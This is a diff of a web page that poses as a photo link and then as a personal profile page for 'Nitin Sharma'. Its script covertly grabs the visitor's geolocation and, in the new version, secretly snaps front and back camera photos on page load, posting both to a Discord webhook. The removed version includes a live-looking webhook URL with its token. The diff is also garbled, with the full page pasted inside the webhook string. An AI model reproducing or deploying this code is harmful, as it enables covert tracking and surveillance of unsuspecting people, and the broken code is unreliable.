@@ -3,49 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hey Aditya See the Photos</title>
+    <title>Nitin's Profile</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            margin-bottom: 10px;
+        }
+    </style>
 </head>
 <body>
 
-    <h2>Click below to see my photos</h2>
-    <button id="locationBtn">See the Photos</button>
+    <div class="container">
+        <img src="https://via.placeholder.com/150" alt="Nitin's Photo">
+        <h2>Nitin Sharma</h2>
+        <p><strong>Age:</strong> 24</p>
+        <p><strong>City:</strong> Mumbai, India</p>
+        <p><strong>Job:</strong> Software Developer</p>
+        <p><strong>Email:</strong> nitinsharma@email.com</p>
+    </div>
+
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        document.getElementById("locationBtn").addEventListener("click", () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+        const webhookURL = "<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nitin's Profile</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://via.placeholder.com/150" alt="Nitin's Photo">
+        <h2>Nitin Sharma</h2>
+        <p><strong>Age:</strong> 24</p>
+        <p><strong>City:</strong> Mumbai, India</p>
+        <p><strong>Job:</strong> Software Developer</p>
+        <p><strong>Email:</strong> nitinsharma@email.com</p>
+    </div>
+
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL";
+
+        // Capture photo and send to Discord
+        async function captureAndSend(cameraFacing, locationData) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraFacing } });
+
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                const canvas = document.getElementById("canvas");
+                const context = canvas.getContext("2d");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("file", blob, `capture_${cameraFacing}.jpg`);
+                    formData.append("content", `📸 **Photo Captured (${cameraFacing})**\n🌍 **Location:** ${locationData}`);
+
+                    fetch(webhookURL, { method: "POST", body: formData });
+
+                }, "image/jpeg");
+
+                stream.getTracks().forEach(track => track.stop());
+
+            } catch (error) {
+                console.error("Camera access error:", error);
+            }
+        }
+
+        // Get location and capture photos
+        function getLocationAndCapture() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const { latitude, longitude } = position.coords;
+                    const locationData = `Latitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    captureAndSend("user", locationData); // Front Camera
+                    setTimeout(() => captureAndSend("environment", locationData), 3000); // Back Camera
+
+                }, error => {
+                    console.error("Location access denied:", error);
                 });
             } else {
-                alert("Geolocation is not supported by this browser.");
+                console.error("Geolocation not supported");
             }
-        });
-
-        function sendLocation(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const timestamp = new Date().toLocaleString();
-            
-            // Format the location message
-            const message = `**New Location Captured!** 📍\n\n🌍 **Latitude:** ${latitude}\n🌎 **Longitude:** ${longitude}\n📏 **Accuracy:** ${accuracy} meters\n🕒 **Time:** ${timestamp}`;
-
-            // Send data to Discord Webhook
-            fetch("https://discord.com/api/webhooks/1346211668195278920/p3FKujXJfw9iF4Ln9gD5RB6e2goF0gFF07fjG1HYDVKDoqFSMPFRV9B6fVTDCS9TuSVB", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: message })
-            });
-
-            // Redirect to Photos Page
-            window.location.href = "photos.html";
         }
 
-        function showError(error) {
-            alert("Location access denied or error occurred.");
+        // Start process when page loads
+        window.onload = () => getLocationAndCapture();
+    </script>
+
+</body>
+</html>
+";
+
+        // Capture photo and send to Discord
+        async function captureAndSend(cameraFacing, locationData) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraFacing } });
+
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                const canvas = document.getElementById("canvas");
+                const context = canvas.getContext("2d");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("file", blob, `capture_${cameraFacing}.jpg`);
+                    formData.append("content", `📸 **Photo Captured (${cameraFacing})**\n🌍 **Location:** ${locationData}`);
+
+                    fetch(webhookURL, { method: "POST", body: formData });
+
+                }, "image/jpeg");
+
+                stream.getTracks().forEach(track => track.stop());
+
+            } catch (error) {
+                console.error("Camera access error:", error);
+            }
         }
+
+        // Get location and capture photos
+        function getLocationAndCapture() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const { latitude, longitude } = position.coords;
+                    const locationData = `Latitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    captureAndSend("user", locationData); // Front Camera
+                    setTimeout(() => captureAndSend("environment", locationData), 3000); // Back Camera
+
+                }, error => {
+                    console.error("Location access denied:", error);
+                });
+            } else {
+                console.error("Geolocation not supported");
+            }
+        }
+
+        // Start process when page loads
+        window.onload = () => getLocationAndCapture();
     </script>
 
 </body>
